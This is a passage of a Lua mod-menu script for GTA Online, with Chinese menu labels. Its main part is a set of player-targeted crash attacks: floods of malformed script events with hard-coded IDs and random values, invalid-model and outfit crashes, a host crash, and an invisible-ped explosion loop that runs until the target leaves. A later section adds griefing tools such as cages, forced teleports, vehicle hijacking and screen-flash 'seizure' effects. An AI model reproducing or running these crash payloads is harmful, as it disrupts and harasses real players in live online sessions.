				local jesus = entities.create_ped(2, mdl, pos, 0)
				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
				util.yield(100)
				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
				util.yield(1000)
				entities.delete_by_handle(jesus)
				entities.delete_by_handle(veh)
			end
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
    end)

    menu.action(PlayerMainMenu, "懂哥崩", {"dongge"}, "", function()

    dongge(PlayerID)

    end)


    menu.toggle_loop(PlayerMainMenu, "碎片崩溃V1", {"togglefragv1"}, "Skidded From 2take1", function(on_toggle)
        v1_frag(PlayerID)
        end)
        
        menu.toggle_loop(PlayerMainMenu, "碎片崩溃V2", {"togglefragv2"}, "", function(on_toggle)
            v2_frag(PlayerID)
        end)
        
        menu.toggle(PlayerMainMenu, "碎片崩溃V3", {"togglefragv3"}, "", function(on_toggle)
            notification("正在发送碎片崩溃V3给 " .. PLAYER.GET_PLAYER_NAME(PlayerID))
        if on_toggle then
                menu.trigger_commands("togglefragv1" .. players.get_name(PlayerID))
                menu.trigger_commands("togglefragv2" .. players.get_name(PlayerID))
        else
                menu.trigger_commands("togglefragv1" .. players.get_name(PlayerID))
                menu.trigger_commands("togglefragv2" .. players.get_name(PlayerID))
                menu.trigger_commands("superc")
            end
        
        end)


    menu.action(PlayerMainMenu, "泡泡糖崩溃", {""}, "", function()

    LilYachty(PlayerID)

    end)



    menu.action(PlayerMainMenu, "大自然崩溃", {"natural"}, "", function()

    natural(PlayerID)

    end)

    

    menu.action(PlayerMainMenu, "美杜莎崩溃", {}, "", function() 

    MDS(PlayerID)

    end)  

    menu.action(PlayerMainMenu,"瘟疫崩溃", {"wenyi"}, "", function()

    wenyi(PlayerID)

    end)

    

    menu.action(PlayerMainMenu, "OX崩", {"OXCrash"}, "远离!!!远离!!!远离!!!远离!!!远离!!!远离!!!", function()

    

        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)

        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)

    

       local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)

        ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)

        util.yield(100)

        WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)

        util.yield(1000)

        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

        

        util.yield(10000)

    

        entities.delete_by_handle(PED1)

    

        

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_fabien模型")

            local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED2)

        end

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_manuel模型")

            local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED3)

        end

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_taostranslator模型")

            local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED4)

        end

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_taostranslator2模型")

            local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED5)

        end

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_tenniscoach模型")

            local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED6)

        end

        if players.exists(PlayerID) then

            notification("未能移除玩家,正在使用cs_wade模型")

            local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)

            ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)

            util.yield(100)

            WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)

            util.yield(1000)

            FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)

    

            util.yield(10000)

    

            entities.delete_by_handle(PED7)

        end

        if not players.exists(PlayerID) then

            notification("成功移除玩家")

        end

    end)

    

    menu.click_slider(PlayerMainMenu,"声音崩（不要连点）", {"sound crash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)

        if on_change == 1 then	

            soundcrashv1(PlayerID)

        end   

        if on_change == 2 then

            soundcrashv2(PlayerID)

        end

    end)

    

    menu.action(PlayerMainMenu, "无效模型崩溃", {}, "", function()

    wxcrash(PlayerID)

    end)

    local pclpid = {}
    function get_control_request(ent)
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            local tick = 0
            while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
                tick = tick + 1
                util.yield()
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            end
        end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
            util.toast("Sin control de "..ent)
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end

    menu.action(PlayerMainMenu, "幻想崩溃", {""}, "", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local c = ENTITY.GET_ENTITY_COORDS(p)
        for i = 1, 23 do
            local pclone = entities.create_ped(26, ENTITY.GET_ENTITY_MODEL(p), c, 0)
            pclpid [#pclpid + 1] = pclone 
            PED.CLONE_PED_TO_TARGET(p, pclone)
        end
        local c = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        all_peds = entities.get_all_peds_as_handles()
        local last_ped = 0
        local last_ped_ht = 0
        for k,ped in pairs(all_peds) do
            if not PED.IS_PED_A_PLAYER(ped) and not PED.IS_PED_FATALLY_INJURED(ped) then
                get_control_request(ped)
                if PED.IS_PED_IN_ANY_VEHICLE(ped, true) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_LEAVE_ANY_VEHICLE(ped, 0, 16)
                end
    
                ENTITY.DETACH_ENTITY(ped, false, false)
                if last_ped ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(ped, last_ped, 0, 0.0, 0.0, last_ped_ht-0.5, 0.0, 0.0, 0.0, false, false, false, false, 0, false)
                else
                    ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
                end
                last_ped = ped
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.action(PlayerMainMenu, "5G崩溃", {"5gcrash"}, "", function()

    five5crash(PlayerID)

    end)

    menu.action(PlayerMainMenu, "6G崩溃", {"6gcrash"}, "", function()

        six6crash(PlayerID)
        
    end)

    

    menu.action(PlayerMainMenu, "大JB崩", {"dick"}, "", function()

    dajibab(PlayerID)

    end)

    

    menu.click_slider(PlayerMainMenu,"导弹车崩溃", {"ChernobogCrash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)

        if on_change == 1 then	

            daodanchev1(PlayerID) 

        end

        if on_change == 2 then	

            daodanchev2(PlayerID)

        end

    end)

    

    menu.action(PlayerMainMenu, "脚本崩溃V1", {"scriptcrashv1"}, "jx语录:被和谐的崩溃不如脚本事件", function()
        for i = 1, 15 do
            util.trigger_script_event(1 << PlayerID, {697566862, PlayerID, 0, i, 1, 1, 1})
            util.trigger_script_event(1 << PlayerID, {697566862, PlayerID, 1, i, 1, 1, 1})
            util.trigger_script_event(1 << PlayerID, {697566862, PlayerID, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << PlayerID, {697566862, PlayerID, 10, i, 1, 1, 1})
            util.trigger_script_event(1 << PlayerID, {697566862, PlayerID, 2, i, 1, 1, 1})
            util.trigger_script_event(1 << PlayerID, {697566862, PlayerID, 6, i, 1, 1, 1})
            util.trigger_script_event(1 << PlayerID, {697566862, PlayerID, 4, i, 1, 1, 1})
            util.trigger_script_event(1 << PlayerID, {697566862, PlayerID, 9, i, 1, 1, 1})
        end
    end)

    menu.action(PlayerMainMenu, "脚本崩溃V2", {"scriptcrashv2"}, "jx语录:被和谐的崩溃不如脚本事件", function()
        for i = 1, 200 do
            util.trigger_script_event(1 << PlayerID, {548471420, 16, 804923209, -303901118, 577104152, 653299499, -1218005427, -1010050857, 1831797592, 1508078618, 9, -700037855, -1565442250, 932677838})
        end
    end)

    menu.action(PlayerMainMenu, "脚本崩溃V3", {"scriptcrashv3"}, "jx语录:被和谐的崩溃不如脚本事件", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
            menu.trigger_commands("givesh" .. players.get_name(PlayerID))
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, PlayerID, math.random(int_min, int_max)})
                util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            end
            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
    end)

    menu.action(PlayerMainMenu, "脚本崩溃V4", {"scriptcrashv4"}, "jx语录:被和谐的崩溃不如脚本事件", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 20 do
            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        for i = 1, 20 do
            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, PlayerID, math.random(int_min, int_max)})
            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
            util.trigger_script_event(1 << PlayerID, {697566862, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        for i = 1, 15 do
            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, PlayerID, math.random(int_min, int_max)})
            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        for i = 1, 15 do
            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149, math.random(int_min, int_max), math.random(int_min, int_max), 
            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
            math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << PlayerID, {-904555865, 0, 2291045226935366863, 3941791475669737503, 4412177719075258724, 1343321191, 3457004567006375106, 7887301962187726958, -890968357, 415984063236915669, 1084786880, -452708595, 3922984074620229282, 1929770021948630845, 1437514114, 4913381462110453197, 2254569481770203512, 483555136, 743446330622376960, 2252773221044983930, 513716686466719435, 9003636501510659402, 627697547355134532, 1535056389, 436406710, 4096191743719688606, 4258288501459434149})
        end
        menu.trigger_commands("givesh" .. players.get_name(PlayerID))
        util.yield(200)
        for i = 1, 200 do
            util.trigger_script_event(1 << PlayerID, {548471420, 16, 804923209, -303901118, 577104152, 653299499, -1218005427, -1010050857, 1831797592, 1508078618, 9, -700037855, -1565442250, 932677838})
        end
    end)

    menu.action(PlayerMainMenu, "脚本崩溃V5", {"scriptcrashv5"}, "jx语录:被和谐的崩溃不如脚本事件", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
                end
                util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max)})
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max)})
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max)})
                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                end
                menu.trigger_commands("givesh" .. players.get_name(PlayerID))
                util.yield(100)
                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
    end)

    

    menu.action(PlayerMainMenu, "无效外观", {}, "", function()

    BadOutfitCrashV1(PlayerID)

    end)

    

    menu.action(PlayerMainMenu, "无效载具配件", {"BadNetVehicleCrash"}, "", function()
        menu.trigger_commands("crashnightfall"..players.get_name(PlayerID))
        BadNetVehicleCrashV2(PlayerID)
        menu.trigger_commands("6gcrash"..players.get_name(PlayerID))

    end)

    menu.action(PlayerMainMenu, "单崩黄昏", {"crashnightfall"}, "", function()

    HHHM(PlayerID)

    end)

    

    menu.action(PlayerMainMenu, "拖车崩", {""}, "", function()

    tuocheb(PlayerID)

    end)

    

    menu.action(PlayerMainMenu, "主机崩", {}, "崩溃主机（请提前把主机优先级为最低）", function(PlayerID)

        local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())

        menu.trigger_commands("tpmazehelipad")

        ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)

        util.yield(1000)

        menu.trigger_commands("tpmazehelipad")

    end)

    

    menu.action(PlayerMainMenu, "鬼崩（切战局自崩）", {}, "遇事不决就用鬼崩", function()

    guibeng(PlayerID)

    end)

    

    menu.action(PlayerMainMenu,"TP", {""}, "传送到玩家", function()

        local TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)

        local spped = PLAYER.PLAYER_PED_ID()

            local ye = ENTITY.GET_ENTITY_COORDS(TTPed, true)

            ENTITY.SET_ENTITY_COORDS(spped, ye.x, ye.y, ye.z, true, false, false)

            util.yield(10 * math.random())

    end)

    

        end

        players.on_join(GenerateFeatures)



local function playerActionsSetup(pid) 

    local playerMain = menu.list(Heezy, "恶搞", {""}, "")

    local playerOtherTrolling = menu.list(playerMain, "载具恶搞", {}, "")

menu.action(playerOtherTrolling,"传送载具到我", {}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		tp_player_vehicle(pid, pos)
	end)

    menu.action(playerOtherTrolling, "变成小恐龙", {""}, "", function(on_click)

        give_car_addon(pid, util.joaat("h4_prop_h4_loch_monster"), true, -90.0)

    end)



menu.action(playerOtherTrolling, "将墙放在玩家面前", {}, "在玩家面前放置墙壁,半秒后删除", function ()

qfmq(pid)

end)



menu.action(playerOtherTrolling, "将玩家传送到花园银行", {""}, "将玩家的车辆传送到花园银行的塔上", function()

sqhy(pid)

end)

		

menu.action(playerOtherTrolling, "将玩家传送到高空", {""}, "", function()

sqgk(pid)

end)

    

local unlocked_lock = {"不上锁","上锁"}

menu.slider_text(playerOtherTrolling, "劫持车辆", {"hijack"}, "随机 NPC 劫持他们的车辆", unlocked_lock, function(hijackLevel)

    hijacking_vehicles(pid)

end)



menu.toggle_loop(playerOtherTrolling, "随机升级", {"upgradevehicle"}, "", function()
random_upgrade(pid)
    util.yield(500)
end)



menu.toggle_loop(playerOtherTrolling, "让他以为自己能走", {""}, "假象", function ()

ywnz(pid)

end)



lz = menu.list(playerMain, "笼子恶搞", {""}, "")	



menu.action(lz, "笼子", {""}, "", function ()

ptlz(pid)

end)

menu.action(lz, "七度空间", {""}, "", function ()

qdkj(pid)

end)

menu.action(lz, "钱笼子", {""}, "", function ()

zdlz(pid)

end)

menu.action(lz, "垃圾箱", {""}, "", function ()

yylz(pid)

end)

menu.action(lz, "小车车", {""}, "", function ()

cclz(pid)

end)

menu.action(lz, "圣诞快乐", {""}, "", function ()

sdkl1(pid)

end)

menu.action(lz, "圣诞快乐pro", {""}, "", function ()

sdkl2(pid)

end)

menu.action(lz, "圣诞快乐promax", {""}, "", function ()

sdkl3(pid)

end)

menu.action(lz, "电击笼", {""}, "", function ()

djlz(pid)

end)

menu.action(lz, "竞技管", {""}, "", function ()

jjglz(pid)

end)

					

	local cage_loop = false

menu.toggle(lz, "新世纪全自动化套笼", {"autocage"}, "自动套笼子", function(on)

		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		local a = ENTITY.GET_ENTITY_COORDS(player_ped) --first position

		cage_loop = on

		if cage_loop then

			if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then

				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." on")

				util.yield(300)

				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then

					notification("踢出载具失败")

					menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")

					return

				end

				menu.trigger_commands("freeze"..PLAYER.GET_PLAYER_NAME(pid).." off")

				a =  ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))

			end

			cage_player(a)

		end

        if not players.exists(pid) then
            util.stop_thread()
end

		while cage_loop do

			local b = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)) 

			local ba = {x = b.x - a.x, y = b.y - a.y, z = b.z - a.z} 

			if math.sqrt(ba.x * ba.x + ba.y * ba.y + ba.z * ba.z) >= 4 then 

				a = b

				if PED.IS_PED_IN_ANY_VEHICLE(player_ped, false) then

					goto continue

				end

				cage_player(a)

				notification(PLAYER.GET_PLAYER_NAME(pid).."跑出来了，再次套住")

				::continue::

			end

			util.yield(1000)

		end

	end)

menu.action(lz, "删除笼子", {""}, "只能删除简单的笼子", function() -- ez fix but lazy

	for key, value in pairs(cages) do

		entities.delete_by_handle(value)

	end

end)



cage_table = {}

menu.toggle_loop(lz,"Ped笼子", {'PCAGE'}, "将玩家困在Ped笼子里", function ()

    pedcageg(pid)

end)

menu.action(lz, "解除Ped笼", {'FreePedcage'}, "将玩家从Ped笼子中释放", function ()

    freecageg(pid)

end)



local jindianegao = menu.list(playerMain, "经典恶搞", {}, "") 
    seizures = menu.list(jindianegao, "闪屏", {}, "", function(); end)

    menu.toggle_loop(seizures, "闪屏 V1", {"seizurev1"}, "", function()
        if players.exists(pid) then
        seizurev1(pid)
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)


    menu.toggle_loop(seizures, "闪屏 V2", {"seizurev2"}, "", function(on_toggle)
        if players.exists(pid) then
        seizurev2(pid)
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle(seizures, "闪屏 V3", {"seizurev3"}, "", function(on_toggle)
        if players.exists(pid) then
    if on_toggle then
            menu.trigger_commands("seizurev1" .. players.get_name(pid))
            menu.trigger_commands("seizurev2" .. players.get_name(pid))
    else
            menu.trigger_commands("seizurev1" .. players.get_name(pid))
            menu.trigger_commands("seizurev2" .. players.get_name(pid))
        end
    end
end)

    
    local YuleArmy = menu.list(jindianegao, "圣诞怪兽军队", {}, "")

    menu.toggle(YuleArmy, "圣诞怪兽", {"toggleyulemonster"}, "可能导致该玩家崩溃", function(on_toggle)
        if players.exists(pid) then
        if on_toggle then
            menu.trigger_commands("yulearmy" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        else
            menu.trigger_commands("clearyules" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("superclear")
            end  
        end      
    end)

    menu.click_slider(YuleArmy, "生成圣诞怪兽军队", {"yulearmy"}, "", 1, 48, 48, 1, function(val)
        local player_Yule_army = {}
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local Yule = util.joaat("U_M_M_YuleMonster")
        request_model(Yule)
        for i = 1, val do
        player_Yule_army[i] = entities.create_ped(28, Yule, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_Yule_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_Yule_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_Yule_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_Yule_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
